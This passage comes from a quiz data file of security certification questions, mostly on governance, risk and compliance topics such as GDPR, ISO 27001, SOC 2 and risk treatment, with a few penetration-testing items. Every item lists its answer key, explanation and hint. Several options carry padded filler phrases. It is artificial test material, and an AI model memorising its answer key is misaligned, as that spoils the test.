    q: "Why map testing results to a recognised control framework?",
    options: ["To hide the weaknesses that were found behind a long list of numbered control codes","To reduce the scope of the next test until only the easy controls are left to check","To avoid having to report any of the results to the people who own the systems","To show coverage and gaps in a common language"],
    correct: 3, why: "Frameworks give a common structure for assurance.",
    hint: "Common language."
  },
  {
    id: 398, rank: 4, role: "pentest", topic: "Quantum Readiness Review", difficulty: "EXPERT",
    q: "How should an organisation prepare for future cryptographic change?",
    options: ["Ignore the topic, until the next scheduled review takes place","Wait until all algorithms are broken","Remove all encryption, until the next scheduled review takes place","Inventory cryptography and plan for agile replacement"],
    correct: 3, why: "An inventory and agility enable timely migration.",
    hint: "Inventory crypto."
  },
  {
    id: 399, rank: 4, role: "pentest", topic: "Purple Team Metrics Exhibit", difficulty: "EXPERT",
    exhibit: "Quarter  Techniques covered  True-positive rate\nQ1       18                  71%\nQ2       27                  58%\nQ3       34                  44%\nQ4       41                  39%",
    q: "What does this quarterly purple team trend suggest?",
    options: ["Coverage grows but alert quality falls and needs tuning","Coverage, and quality are both rising steadily in each of the four quarters","Nothing changed in any quarter","Coverage is falling while quality is rising in every one of the four quarters"],
    correct: 0, why: "More rules raised false positives, so tuning is the next step.",
    hint: "Two trends."
  },
  {
    id: 400, rank: 4, role: "pentest", topic: "Control Ownership Model", difficulty: "EXPERT",
    q: "Who should own the remediation of a finding about a business application's access controls?",
    options: ["The tester who found the issue, and who wrote the report for the client team","The external auditor who reviews the controls for the annual compliance exercise","The application owner with security and engineering","The vendor of the testing tool that detected the weakness in the application"],
    correct: 2, why: "Risk and fixes belong to the owner of the asset.",
    hint: "Asset owner."
  },
  {
    id: 401, rank: 0, role: "grc", topic: "Standards and Procedures", difficulty: "BEGINNER",
    q: "How do standards and procedures relate to a security policy?",
    options: ["They are written by the vendor, and replace the policy completely","They describe the products that the company bought last year","They give the detailed steps and requirements for it","They are only needed by the auditors, and never by the staff on duty"],
    correct: 2, why: "Policies state intent, standards set requirements and procedures give the steps.",
    hint: "Detail under intent."
  },
  {
    id: 402, rank: 0, role: "grc", topic: "Risk Definition", difficulty: "BEGINNER",
    q: "Which statement best defines risk?",
    options: ["The chance of a threat exploiting a weakness, and its impact, in most cases","Any security tool that has stopped working during the working week for a few hours","A weakness found by a scanner on any system in the company, as a general rule","The number of staff who work in the security team"],
    correct: 0, why: "Risk combines how likely something is with how bad the consequences would be.",
    hint: "Likelihood and impact."
  },
  {
    id: 403, rank: 0, role: "grc", topic: "Risk Tolerance Statement", difficulty: "BEGINNER",
    q: "What does risk tolerance describe in a risk framework?",
    options: ["The premium paid to the insurer for the year that has just ended","The amount of risk that a company has already removed completely","How far results may stray from the stated appetite","The total number of risks recorded as the company was founded"],
    correct: 2, why: "Tolerance sets the acceptable variation around the risk appetite that leaders have agreed.",
    hint: "Allowed variation."
  },
  {
    id: 404, rank: 0, role: "grc", topic: "Risk Treatment Options", difficulty: "BEGINNER",
    q: "A business decides to stop an activity because its risk is too high. Which treatment is this?",
    options: ["Mitigation by adding a further control","Acceptance of the risk after approval","Avoidance, in most cases","Transfer of the risk through an insurance policy"],
    correct: 2, why: "Avoiding a risk means not doing the activity that creates it.",
    hint: "Stop doing it."
  },
  {
    id: 405, rank: 0, role: "grc", topic: "Data Classification Purpose", difficulty: "BEGINNER",
    q: "Why do organisations classify data as public, internal or confidential?",
    options: ["To apply handling controls that match how sensitive the data is","To decide which colour of folder the paper copies should be filed in","To reduce the total amount of data that the company stores each year","To rank employees by how many files they are allowed to open"],
    correct: 0, why: "Classification drives access, storage, sharing and disposal rules.",
    hint: "Handling by sensitivity."
  },
  {
    id: 406, rank: 0, role: "grc", topic: "GDPR Data Subject Right", difficulty: "BEGINNER",
    q: "Which of these is a right of an individual under GDPR?",
    options: ["Receiving a refund of any fee paid to the company, until the next scheduled review takes place","Choosing which security controls the company must buy","Reading the company's confidential business plans","Asking to access the personal data held about them"],
    correct: 3, why: "Data subjects can request access, correction and in some cases erasure of their personal data.",
    hint: "Access to own data."
  },
  {
    id: 407, rank: 0, role: "grc", topic: "ISO 27001 Meaning", difficulty: "BEGINNER",
    q: "What does ISO 27001 specify?",
    options: ["A list of passwords that are banned in every country, and every industry sector","Requirements for an information security management system","The exact firewall brand that every certified company must install on its network","The price that auditors may charge for reviewing a company's security controls each year"],
    correct: 1, why: "It sets management system requirements, and organisations can be certified against it.",
    hint: "Management system."
  },
  {
    id: 408, rank: 0, role: "grc", topic: "SOC 2 Report", difficulty: "BEGINNER",
    q: "What is a SOC 2 report mainly used for?",
    options: ["Replacing the need for a company to have any written security policies at all","Listing the passwords of the provider's administrators for the customer's auditors","Proving that a company has never suffered a security incident in its whole history","Giving customers assurance about a service provider's controls"],
    correct: 3, why: "An independent auditor reports on controls relevant to security and related criteria.",
    hint: "Assurance for customers."
  },
  {
    id: 409, rank: 0, role: "grc", topic: "Audit Evidence", difficulty: "BEGINNER",
    q: "An auditor asks how you know access reviews were completed. What should you provide?",
    options: ["The password policy document alone, with no records of the reviews","A statement from a manager that they usually do it","A promise to complete the reviews before the next audit, as a general rule","Dated records showing who reviewed what and the outcome"],
    correct: 3, why: "Evidence must show the control operated, with dates, owners and results.",
    hint: "Show records."
  },
  {
    id: 410, rank: 0, role: "grc", topic: "Third-Party Risk", difficulty: "BEGINNER",
    q: "A company wants to use a new cloud supplier that will hold customer data. What is the BEST first step?",
    options: ["Assess the supplier's security and agree contract terms before sharing data","Send the data now and review the supplier next year, and review the outcome at the next monthly meeting","Sign the contract first and ask about security after launch, then record the result in the ticket","Rely on the supplier's website claims alone, and revisit the decision after the next release"],
    correct: 0, why: "Relying on the website is the runner-up as it is quick, but it is not evidence; assessment and contract controls come before data sharing.",
    hint: "Assess before sharing."
  },
  {
    id: 411, rank: 0, role: "grc", topic: "Business Continuity Meaning", difficulty: "BEGINNER",
    q: "What is the goal of business continuity planning?",
    options: ["Keeping critical services running or restoring them quickly after a disruption","Reducing the number of employees in the organisation, and revisit the decision after the next release","Preventing every possible attack on the organisation's network, and revisit the decision after the next release","Moving all data into the cloud as quickly as possible, and revisit the decision after the next release"],
    correct: 0, why: "BCP prepares the organisation to continue essential operations during disruption.",
    hint: "Keep operating."
  },
  {
    id: 412, rank: 0, role: "grc", topic: "RTO and RPO", difficulty: "BEGINNER",
    q: "What does a recovery point objective (RPO) describe?",
    options: ["How many staff are needed for recovery","How long a system may take to be restored after an outage has started","How much money the recovery will cost","How much data loss is acceptable, measured in time"],
    correct: 3, why: "RPO is the maximum age of data that can be lost; RTO is the time allowed to restore service.",
    hint: "Data loss window."
  },
  {
    id: 413, rank: 0, role: "grc", topic: "Separation of Duties", difficulty: "BEGINNER",
    q: "Why should the person who requests a payment not be the one who approves it?",
    options: ["It means staff do not trust anyone","It makes the process slower on purpose to discourage staff from requesting payments","It is required by every browser","Two people reduce the chance of error or fraud"],
    correct: 3, why: "Separating duties means one person cannot complete a sensitive action alone.",
    hint: "Two sets of eyes."
  },
  {
    id: 414, rank: 0, role: "grc", topic: "Policy Review Cycle", difficulty: "BEGINNER",
    q: "How often should security policies normally be reviewed?",
    options: ["Every day","Only when an auditor asks","At planned intervals and after major changes, in most cases","Never, once they have been approved by the board in the first year"],
    correct: 2, why: "Regular and event-driven review keeps policies accurate and relevant.",
    hint: "Planned and triggered."
  },
  {
    id: 415, rank: 0, role: "grc", topic: "Confidential Paper Disposal", difficulty: "BEGINNER",
    q: "What should happen to printed confidential papers that are no longer needed?",
    options: ["Be kept on the desk until the end of the month, in most cases","Be left on the printer, and others can reuse them","Be thrown into the normal waste bin by the desk, in most cases","Be shredded or placed in a locked confidential disposal bin"],
    correct: 3, why: "Confidential papers must be destroyed securely so that nobody can recover the information.",
    hint: "Destroy securely."
  },
  {
    id: 416, rank: 0, role: "grc", topic: "Risk Register Entry", difficulty: "BEGINNER",
    exhibit: "ID: R-014 | Risk: Supplier holds unencrypted customer data | Likelihood: 3 | Impact: 4 | Owner: (blank) | Treatment: (blank)",
    q: "Which item is essential in a risk register entry?",
    options: ["A named risk owner and a treatment decision","The number of pages in the policy, in most cases","The colour of the report cover, in most cases","The date the auditor was born"],
    correct: 0, why: "Ownership and decisions make risks manageable and trackable.",
    hint: "Owner and decision."
  },
  {
    id: 417, rank: 0, role: "grc", topic: "Control Types", difficulty: "BEGINNER",
    q: "A security camera at the entrance that records visitors is which type of control?",
    options: ["Preventive, as it stops everyone entering","Compensating, as it replaces a missing policy","Detective","Corrective, as it repairs the damage after an incident"],
    correct: 2, why: "Cameras record and help find incidents after the event; they do not themselves stop entry.",
    hint: "Records afterwards."
  },
  {
    id: 418, rank: 0, role: "grc", topic: "Asset Inventory Value", difficulty: "BEGINNER",
    q: "Why is an up-to-date asset inventory important for security governance?",
    options: ["It reduces the number of laptops","You cannot protect or assess what you do not know you have","It makes the office look tidy","It replaces the need for taking regular backups of the production systems"],
    correct: 1, why: "Inventory underpins risk assessment, patching and incident response.",
    hint: "Know your assets."
  },
  {
    id: 419, rank: 0, role: "grc", topic: "Security Awareness Training", difficulty: "BEGINNER",
    q: "Staff keep falling for simple phishing emails. What is the BEST improvement to the awareness programme?",
    options: ["One long annual training with no follow-up","Short, regular, role-relevant training with easy reporting, as a general rule","Punishing every employee who clicks, until the next scheduled review takes place","Removing all email from the company, until the next scheduled review takes place"],
    correct: 1, why: "Punishment is the runner-up since it signals seriousness, but it discourages reporting; regular practical training works better.",
    hint: "Regular and relevant."
  },
  {
    id: 420, rank: 0, role: "grc", topic: "Incident Reporting Duty", difficulty: "BEGINNER",
    q: "A staff member sees a lost laptop that holds personal data. What should the policy say?",
    options: ["Mention it at the next annual meeting","Tell a friend first, until the next scheduled review takes place","Wait to see whether it turns up, and revisit the decision after the next release","Report it immediately through the defined incident channel"],
    correct: 3, why: "Prompt reporting lets the organisation assess impact and meet legal deadlines.",
    hint: "Report at once."
  },
  {
    id: 421, rank: 0, role: "grc", topic: "Compliance Versus Security", difficulty: "BEGINNER",
    q: "Which statement about compliance and security is most accurate?",
    options: ["Compliance guarantees that no breach will ever happen once the audit has been passed","They are always exactly the same thing","Compliance sets a minimum and security needs ongoing risk management","Security is only needed when an audit is due"],
    correct: 2, why: "Meeting a standard does not replace managing real risks.",
    hint: "Minimum, not guarantee."
  },
  {
    id: 422, rank: 0, role: "grc", topic: "Data Retention", difficulty: "BEGINNER",
    q: "Why should personal data be deleted once there is no longer a reason to keep it?",
    options: ["Keeping it longer raises risk and may break privacy rules","Deleting data always makes every system faster, and cheaper to run in the company","Auditors prefer empty systems","It saves paper"],
    correct: 0, why: "Storage limitation reduces exposure and supports privacy obligations.",
    hint: "Do not keep forever."
  },
  {
    id: 423, rank: 0, role: "grc", topic: "Joiner Mover Leaver", difficulty: "BEGINNER",
    q: "What should happen to a leaver's system access?",
    options: ["It is removed promptly on or before their last day","It is left for IT to notice","It is shared with their team","It stays active for a year as a courtesy"],
    correct: 0, why: "Timely removal prevents misuse of dormant accounts.",
    hint: "Remove promptly."
  },
  {
    id: 424, rank: 0, role: "grc", topic: "Vendor Questionnaire Review", difficulty: "BEGINNER",
    exhibit: "Q7 Do you encrypt customer data at rest? Yes\nQ8 Do you test backups? Yes\nQ9 Do you have an incident plan? Yes\nEvidence attached: none",
    q: "A supplier answers 'yes' to every question on a security questionnaire without any evidence. What should the assessor do?",
    options: ["Assume the supplier is lying","Ask for supporting evidence and follow up on key controls, as a general rule","Accept the answers as true, and file the questionnaire away with the contract documents","Reject all suppliers"],
    correct: 1, why: "Self-declared answers need verification proportionate to the risk.",
    hint: "Ask for proof."
  },
  {
    id: 425, rank: 0, role: "grc", topic: "Risk Appetite", difficulty: "BEGINNER",
    q: "What does risk appetite describe?",
    options: ["The number of risks in a register","The price of insurance","The hunger of the security team","The amount and type of risk an organisation is willing to accept"],
    correct: 3, why: "Appetite guides decisions on when to accept, treat or avoid risk.",
    hint: "Willingness to accept."
  },
  {
    id: 426, rank: 0, role: "grc", topic: "Change Management", difficulty: "BEGINNER",
    q: "Why do organisations use a change management process for production systems?",
    options: ["To replace testing","To give developers extra work each week","To stop all changes from ever happening in the company, in most cases","To assess, approve and record changes so that problems can be traced"],
    correct: 3, why: "Controlled changes reduce outages and security gaps and provide an audit trail.",
    hint: "Control the change."
  },
  {
    id: 427, rank: 0, role: "grc", topic: "BYOD Policy", difficulty: "BEGINNER",
    q: "What should a bring-your-own-device policy require?",
    options: ["That company data is stored on personal clouds","Minimum security settings and the ability to remove company data","Nothing as employees own the device","That devices have no passwords"],
    correct: 1, why: "Personal devices still need controls to protect company information.",
    hint: "Protect company data."
  },
  {
    id: 428, rank: 0, role: "grc", topic: "Policy Exception Handling", difficulty: "BEGINNER",
    q: "A manager asks to skip a security control for a project deadline. What is the BEST response?",
    options: ["Ignore the request","Approve it verbally, and move on","Record a time-limited exception with an owner and compensating controls","Refuse any exception under every circumstance, until the next scheduled review takes place"],
    correct: 2, why: "Refusing everything is the runner-up as it is strict, but it pushes people to bypass the process; managed exceptions keep risk visible.",
    hint: "Formal and temporary."
  },
  {
    id: 429, rank: 0, role: "grc", topic: "Key Risk Indicator", difficulty: "BEGINNER",
    q: "Which item is the best example of a key risk indicator (KRI)?",
    options: ["The number of staff photos taken","The number of critical vulnerabilities open beyond their deadline","The colour of the dashboard","The number of meetings held"],
    correct: 1, why: "KRIs show whether risk exposure is rising or falling against thresholds.",
    hint: "Early warning measure."
  },
  {
    id: 430, rank: 0, role: "grc", topic: "Privacy Notice", difficulty: "BEGINNER",
    q: "What should a privacy notice explain to individuals?",
    options: ["The security passwords of the organisation, as a general rule","The salaries of the executives","What personal data is collected, why, and how it is used","The architecture of the network"],
    correct: 2, why: "Transparency is a core privacy principle.",
    hint: "Tell people."
  },
  {
    id: 431, rank: 0, role: "grc", topic: "DPIA Trigger", difficulty: "BEGINNER",
    q: "When is a data protection impact assessment most likely to be needed?",
    options: ["When changing the office furniture","Before a new system that processes sensitive data at large scale, as a general rule","When hiring a cleaner","When printing a leaflet"],
    correct: 1, why: "A DPIA assesses privacy risk before high-risk processing starts.",
    hint: "High-risk processing."
  },
  {
    id: 432, rank: 0, role: "grc", topic: "PCI DSS Scope", difficulty: "BEGINNER",
    q: "What does PCI DSS apply to?",
    options: ["Organisations that store, process or transmit payment card data, in most cases","Only banks' head offices","Only government agencies","Every website in the world"],
    correct: 0, why: "It is the industry standard for protecting cardholder data.",
    hint: "Card data."
  },
  {
    id: 433, rank: 0, role: "grc", topic: "NIST CSF Functions", difficulty: "BEGINNER",
    q: "Which list gives the core functions of the NIST Cybersecurity Framework 2.0?",
    options: ["Prevent, Pay, Pray, Pass, and review the outcome at the next monthly meeting","Govern, Identify, Protect, Detect, Respond, Recover, in most cases","Plan, Do, Check, Act","Buy, Build, Test, Sell, until the next scheduled review takes place"],
    correct: 1, why: "CSF 2.0 added Govern to the original five functions.",
    hint: "Six functions."
  },
  {
    id: 434, rank: 0, role: "grc", topic: "Audit Finding Response", difficulty: "BEGINNER",
    q: "An audit finding states that backups were never tested. What is the best management response?",
    options: ["Hide the finding, and review the outcome at the next monthly meeting","Dispute the finding without checking","Agree an action plan with an owner and date, and retest the control","Wait for next year, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Findings need owned and tracked corrective actions.",
    hint: "Plan with owner and date."
  },
  {
    id: 435, rank: 0, role: "grc", topic: "Clean Desk Policy", difficulty: "BEGINNER",
    q: "What is the purpose of a clean desk policy?",
    options: ["To stop sensitive papers and devices being seen or taken","To save on cleaning costs","To make the office look modern","To improve desk comfort"],
    correct: 0, why: "Leaving information unattended creates risk of theft or exposure.",
    hint: "Do not leave it out."
  },
  {
    id: 436, rank: 0, role: "grc", topic: "Password Policy Basics", difficulty: "BEGINNER",
    q: "Which password policy approach is most consistent with current guidance?",
    options: ["Reusing passwords across sites, and revisit the decision after the next release","Long passphrases checked against breached lists, with MFA, in most cases","Writing passwords on notes, and review the outcome at the next monthly meeting","Changing complex passwords every 30 days, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Modern guidance favours length, screening and MFA over forced frequent changes.",
    hint: "Length and screening."
  },
  {
    id: 437, rank: 0, role: "grc", topic: "Insurance and Risk Transfer", difficulty: "BEGINNER",
    q: "What does buying cyber insurance mainly do?",
    options: ["Guarantees no regulator action","Transfers part of the financial impact of an incident","Prevents incidents","Removes the need for any controls"],
    correct: 1, why: "Insurance shares financial loss but does not replace security controls.",
    hint: "Money, not prevention."
  },
  {
    id: 438, rank: 0, role: "grc", topic: "Security Metrics for Managers", difficulty: "BEGINNER",
    q: "Which measure best helps managers see if patching is working?",
    options: ["Length of the policy","Number of security posters","Number of servers","Percentage of critical patches applied within the target time"],
    correct: 3, why: "Timeliness of critical patching shows control effectiveness.",
    hint: "Within target time."
  },
  {
    id: 439, rank: 0, role: "grc", topic: "Shared Responsibility in Outsourcing", difficulty: "BEGINNER",
    q: "A company outsources payroll processing to a provider. Who remains accountable for the protection of employee data?",
    options: ["The company, even though the provider does the work","The employees whose data it is","Nobody, as the data is in another company's system","The provider alone, once a contract is signed"],
    correct: 0, why: "Responsibility can be delegated but accountability for personal data stays with the data controller.",
    hint: "Accountability stays."
  },
  {
    id: 440, rank: 0, role: "grc", topic: "Security Roles", difficulty: "BEGINNER",
    q: "Who should normally own the risk to a business system and approve how it is treated?",
    options: ["The external auditor reviewing the control environment","The vendor who sold the system to the organisation","The business owner of that system","The newest member of the IT helpdesk team"],
    correct: 2, why: "Risk owners are accountable managers who can decide to accept, treat or avoid risk.",
    hint: "Business owns risk."
  },
  {
    id: 441, rank: 1, role: "grc", topic: "Statement of Applicability", difficulty: "INTERMEDIATE",
    q: "What does the Statement of Applicability in ISO 27001 record?",
    options: ["The list of every employee who has signed the acceptable use policy","The budget approved for the security team over the coming financial year","The results of the last penetration test performed by an outside firm","Which controls apply and why others are excluded"],
    correct: 3, why: "The SoA lists the Annex A controls selected or excluded, with justification and implementation status.",
    hint: "Applicable controls."
  },
  {
    id: 442, rank: 1, role: "grc", topic: "Risk Scoring Matrix", difficulty: "INTERMEDIATE",
    exhibit: "Risk R-031 Likelihood 4 Impact 5 Score 20\nBands: 1-6 Low | 7-12 Medium | 13-18 High | 19-25 Very high",
    q: "Likelihood is rated 4 and impact is rated 5 on a 5x5 matrix. Which interpretation is correct?",
    options: ["Medium risk that is reviewed only once every few years","Low risk that can be accepted by the system administrator","Very high risk needing prompt treatment","Not scorable until the control owner has been replaced"],
    correct: 2, why: "A score of 20 on a 25-point scale sits in the top band and needs a senior decision and treatment plan.",
    hint: "High times high."
  },
  {
    id: 443, rank: 1, role: "grc", topic: "Breach Notification Timeline", difficulty: "INTERMEDIATE",
    q: "A company confirms a personal data breach likely to risk individuals' rights. Under GDPR, what is the BEST action regarding the regulator?",
    options: ["Notify only the customers and skip the regulator until the investigation closes","Notify the supervisory authority within 72 hours of becoming aware","Wait for the full forensic report before telling anyone","Notify once the press has asked about it, and the story has been published online"],
    correct: 1, why: "Waiting for the full report is the runner-up since facts will be fuller, but the clock runs from awareness and updates can follow.",
    hint: "72 hours from awareness."
  },
  {
    id: 444, rank: 1, role: "grc", topic: "Control Testing Types", difficulty: "INTERMEDIATE",
    q: "An auditor re-performs a reconciliation to confirm it works as described. Which testing method is this?",
    options: ["Inspection of the policy that describes the reconciliation","Inquiry of the control owner, and notes from the discussion","Observation of the process being carried out on one day","Re-performance, as a general rule"],
    correct: 3, why: "Re-performance is the auditor independently executing the control to check the result.",
    hint: "Do it again."
  },
  {
    id: 445, rank: 1, role: "grc", topic: "Business Impact Analysis", difficulty: "INTERMEDIATE",
    q: "What does a business impact analysis (BIA) produce?",
    options: ["Critical processes with their recovery priorities, and time limits, in most cases","A list of the vendors that the procurement team has used in the last financial year","A diagram of the office network with every cable shown","A ranking of the staff members by how long they have worked"],
    correct: 0, why: "The BIA identifies what matters most and how long it can be unavailable, driving RTO and RPO.",
    hint: "What matters, how fast."
  },
  {
    id: 446, rank: 1, role: "grc", topic: "Compensating Control", difficulty: "INTERMEDIATE",
    q: "A legacy system cannot support MFA required by policy. What is the BEST way to handle this gap?",
    options: ["Switch off the system immediately whatever the impact on the business may be","Approve a time-limited exception with compensating controls","Change the policy, and MFA is no longer required for anything","Ignore the requirement as the system is old"],
    correct: 1, why: "Switching off is the runner-up as it removes the risk, but it may be disproportionate; a managed exception with compensating controls keeps services running.",
    hint: "Managed exception."
  },
  {
    id: 447, rank: 1, role: "grc", topic: "Data Processing Agreement", difficulty: "INTERMEDIATE",
    q: "Why must a controller sign a data processing agreement with a supplier that handles personal data on its behalf?",
    options: ["It lets the supplier use the data for its own marketing, and product research","It makes the supplier cheaper as the contract replaces its normal price list","It avoids the need for any encryption of data held by the supplier on its servers","The law requires written terms on instructions and security"],
    correct: 3, why: "GDPR Article 28 requires a contract setting out the processor's obligations.",
    hint: "Required by Article 28."
  },
  {
    id: 448, rank: 1, role: "grc", topic: "International Transfer", difficulty: "INTERMEDIATE",
    q: "A company wants to send personal data of EU residents to a provider in a country without an adequacy decision. What is typically needed?",
    options: ["No action is needed as long as the data is encrypted while it is in transit","Only a verbal agreement between the two companies that is noted in the meeting minutes","A new cookie banner on the website that explains where the servers are located","A safeguard such as standard contractual clauses and an assessment"],
    correct: 3, why: "Transfers need a lawful mechanism and an assessment of local law risks.",
    hint: "Safeguard needed."
  },
  {
    id: 449, rank: 1, role: "grc", topic: "Vendor Risk Tiering", difficulty: "INTERMEDIATE",
    q: "How should a company decide how deeply to assess each supplier?",
    options: ["By the alphabetical order of the supplier names in the procurement system","By the sensitivity of data and criticality of the service","By the size of the supplier's logo","By how friendly the sales contact is"],
    correct: 1, why: "Risk-based tiering focuses effort where a failure would hurt most.",
    hint: "Tier by impact."
  },
  {
    id: 450, rank: 1, role: "grc", topic: "SOC 2 Type Difference", difficulty: "INTERMEDIATE",
    q: "What is the key difference between a SOC 2 Type 1 and a Type 2 report?",
    options: ["Type 2 tests operation over a period, Type 1 reviews design at a date","They are identical","Type 1 covers more countries","Type 2 is shorter to produce, and is meant only for small start-up companies"],
    correct: 0, why: "Type 2 gives evidence that controls worked over time.",
    hint: "Point in time versus period."
  },
  {
    id: 451, rank: 1, role: "grc", topic: "Policy Hierarchy", difficulty: "INTERMEDIATE",
    q: "Where do detailed technical requirements such as password length normally belong?",
    options: ["In standards that support the high-level policy","In the company's mission statement published on the public website","In the marketing plan","In the visitor leaflet"],
    correct: 0, why: "Policies state intent, standards set mandatory detail, and procedures give steps.",
    hint: "Standards."
  },
  {
    id: 452, rank: 1, role: "grc", topic: "DSAR Handling", difficulty: "INTERMEDIATE",
    q: "A person asks the company for a copy of their personal data. What is the BEST response?",
    options: ["Send the data to whoever emails the request, and the deadline is met","Refuse every request as a matter of policy, and revisit the decision after the next release","Verify identity and reply within the legal time limit","Ignore the request until it is repeated"],
    correct: 2, why: "Sending to whoever emails is the runner-up since it is fast, but unverified disclosure is itself a breach.",
    hint: "Verify, then respond."
  },
  {
    id: 453, rank: 1, role: "grc", topic: "Evidence Sampling", difficulty: "INTERMEDIATE",
    q: "An auditor tests 25 of 4,000 access changes. What must be true for the sample to be reliable?",
    options: ["It is the first 25 on the list","It contains only the newest items","It contains only items chosen by the control owner before the audit begins","It is selected fairly and represents the whole population"],
    correct: 3, why: "Biased samples can hide failures, so selection should be random or risk-based and documented.",
    hint: "Fair selection."
  },
  {
    id: 454, rank: 1, role: "grc", topic: "Incident Classification", difficulty: "INTERMEDIATE",
    q: "Which incident should be classified as the most severe?",
    options: ["A blocked phishing email","A lost phone that was remotely wiped within minutes of being reported missing","Confirmed theft of unencrypted customer records, in most cases","A failed login by a user"],
    correct: 2, why: "Confirmed loss of sensitive unprotected data has legal and business impact.",
    hint: "Data and impact."
  },
  {
    id: 455, rank: 1, role: "grc", topic: "NIS2 Obligation", difficulty: "INTERMEDIATE",
    q: "Which duty is a typical requirement for essential entities under NIS2?",
    options: ["Implement risk management measures and report significant incidents","Avoid using cloud","Hire an auditor monthly","Publish the full network diagram on the company website for customers to read"],
    correct: 0, why: "NIS2 requires security measures, management accountability and timely incident reporting.",
    hint: "Measures and reporting."
  },
  {
    id: 456, rank: 1, role: "grc", topic: "DORA Third Party Register", difficulty: "INTERMEDIATE",
    q: "What does DORA require financial entities to maintain about ICT third-party providers?",
    options: ["Nothing, as long as costs are low","A list of the providers' employees' home addresses, as a general rule","A register of arrangements with contractual and risk information","A copy of each provider's source code"],
    correct: 2, why: "A register supports oversight, concentration risk review and regulator reporting.",
    hint: "Register."
  },
  {
    id: 457, rank: 1, role: "grc", topic: "Awareness Metrics", difficulty: "INTERMEDIATE",
    q: "A GRC manager wants to show the awareness programme is working. What is the BEST measure?",
    options: ["Percent of staff who finished the course quickly, in most cases","Number of slides in the course, as a general rule","Number of emails sent","Trend in phishing report rate and time to report"],
    correct: 3, why: "Completion rates are the runner-up since they are easy to count, but they do not show behaviour change.",
    hint: "Behaviour over completion."
  },
  {
    id: 458, rank: 1, role: "grc", topic: "Control Ownership", difficulty: "INTERMEDIATE",
    exhibit: "Control C-77 Quarterly access review | Owner: (none) | Last result: Fail | Previous result: Fail | Remediation date: (none)",
    q: "A control has no named owner and has failed twice. What is the best governance action?",
    options: ["Ask the auditor to fix it, until the next scheduled review takes place","Wait for the next audit, then record the result in the ticket","Assign an accountable owner and track remediation to closure","Delete the control"],
    correct: 2, why: "Ownership is needed for accountability and follow-up.",
    hint: "Owner first."
  },
  {
    id: 459, rank: 1, role: "grc", topic: "Log Retention Conflict", difficulty: "INTERMEDIATE",
    q: "Security wants to keep logs for 3 years, but privacy rules require minimising personal data. What is the BEST approach?",
    options: ["Keep everything forever","Define retention by log type with justified periods and restricted access","Let each team choose its own period, until the next scheduled review takes place","Delete all logs weekly, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Keeping everything is the runner-up because it supports investigations, but it breaches minimisation without justification.",
    hint: "Justified retention."
  },
  {
    id: 460, rank: 1, role: "grc", topic: "Risk Acceptance Authority", difficulty: "INTERMEDIATE",
    q: "Who should be able to formally accept a high risk?",
    options: ["A senior manager with authority for the affected business area","A new contractor who joined the project team during the previous week","Any security analyst who happens to be on shift when the risk is raised","The vendor who supplied the system that creates the risk for the business"],
    correct: 0, why: "Acceptance must come from someone accountable for the consequences.",
    hint: "Authority and accountability."
  },
  {
    id: 461, rank: 1, role: "grc", topic: "Privacy by Design", difficulty: "INTERMEDIATE",
    q: "What does privacy by design mean when planning a new application?",
    options: ["Letting developers decide later, and revisit the decision after the next release","Collecting as much data as possible, then record the result in the ticket","Building data minimisation and protection into the design from the start","Adding a cookie banner just before launch, until the next scheduled review takes place"],
    correct: 2, why: "Privacy considerations are embedded early rather than added afterwards.",
    hint: "Early, not later."
  },
  {
    id: 462, rank: 1, role: "grc", topic: "Audit Independence", difficulty: "INTERMEDIATE",
    q: "Why should internal auditors be independent of the processes they audit?",
    options: ["To avoid the need for training as auditors already know the processes well","To give an objective opinion free from conflicts of interest","To reduce the cost of the audit function by sharing staff with operations teams","To make audits shorter, and cheaper for the departments that are being reviewed"],
    correct: 1, why: "Independence supports credible assurance.",
    hint: "Objective view."
  },
  {
    id: 463, rank: 1, role: "grc", topic: "Policy Attestation", difficulty: "INTERMEDIATE",
    q: "Why do organisations ask employees to attest annually that they have read key policies?",
    options: ["It reduces the number of policies","It speeds up logins","It shows awareness and supports accountability","It replaces training"],
    correct: 2, why: "Attestation creates a record that staff acknowledged expectations.",
    hint: "Acknowledge and record."
  },
  {
    id: 464, rank: 1, role: "grc", topic: "Cloud Compliance Evidence", difficulty: "INTERMEDIATE",
    q: "A provider supplies ISO 27001 and SOC 2 reports. What should the customer still do?",
    options: ["Nothing, as the reports cover everything","Stop all internal controls","Ask the provider to sign nothing","Review scope and exceptions and cover its own configuration and data responsibilities, and revisit the decision after the next release"],
    correct: 3, why: "Provider assurance covers only its scope under shared responsibility.",
    hint: "Scope and shared duties."
  },
  {
    id: 465, rank: 1, role: "grc", topic: "Regulatory Change", difficulty: "INTERMEDIATE",
    q: "A new regulation affects how the company stores personal data. What is the best first GRC action?",
    options: ["Wait for enforcement action, then record the result in the ticket","Assess applicability and gaps and assign owners and dates","Stop using personal data, then record the result in the ticket","Ask staff to read the law, and review the outcome at the next monthly meeting"],
    correct: 1, why: "A structured gap assessment turns requirements into tracked actions.",
    hint: "Gap and owners."
  },
  {
    id: 466, rank: 1, role: "grc", topic: "Residual Risk Sign-off", difficulty: "INTERMEDIATE",
    q: "After treatment, residual risk is still above appetite. What should happen?",
    options: ["Close the risk","Lower the score","Escalate for further treatment or formal acceptance by an authorised owner","Delete it from the register, and revisit the decision after the next release"],
    correct: 2, why: "Risks above appetite cannot be quietly closed or reduced on paper.",
    hint: "Escalate."
  },
  {
    id: 467, rank: 1, role: "grc", topic: "Tabletop Exercise Purpose", difficulty: "INTERMEDIATE",
    q: "What is the main governance value of a tabletop incident exercise?",
    options: ["Training attackers, and revisit the decision after the next release","Testing decisions, roles and communication before a real crisis","Replacing real backups, and revisit the decision after the next release","Measuring server speed, and revisit the decision after the next release"],
    correct: 1, why: "Exercises reveal gaps in plans and decision-making.",
    hint: "Practice decisions."
  },
  {
    id: 468, rank: 1, role: "grc", topic: "Control Framework Mapping", difficulty: "INTERMEDIATE",
    q: "A company must meet ISO 27001, SOC 2 and PCI DSS. What is the most efficient approach?",
    options: ["Ignore overlaps, and revisit the decision after the next release","Run three separate programmes, and review the outcome at the next monthly meeting","Map one control set to all frameworks and collect evidence once","Choose one framework only"],
    correct: 2, why: "A unified control framework avoids duplicated work and conflicting controls.",
    hint: "Map once."
  },
  {
    id: 469, rank: 1, role: "grc", topic: "Segregation in Access Review", difficulty: "INTERMEDIATE",
